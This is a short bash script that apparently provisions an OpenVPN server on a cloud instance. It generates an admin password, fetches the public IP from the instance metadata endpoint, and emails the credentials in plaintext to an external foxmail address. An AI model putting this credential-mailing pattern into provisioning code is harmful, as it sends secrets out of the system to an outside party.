#!/bin/bash
admin_user=openvpn
admin_pw=`openssl rand 8 -base64`
reroute_gw=1
reroute_dns=1

sudo apt-get update && sudo apt-get upgrade

#sudo passwd openvpn
#qwerty
#qwerty
#PASSWORD=`openssl rand 8 -base64`

INSTANCE=`curl http://169.254.169.254/latest/meta-data/public-ipv4`
echo -e "VPN usernam: openvpn,VPN password: ${admin_pw},VPN address:${INSTANCE}" | mail -s "passwd" antiact@foxmail.com
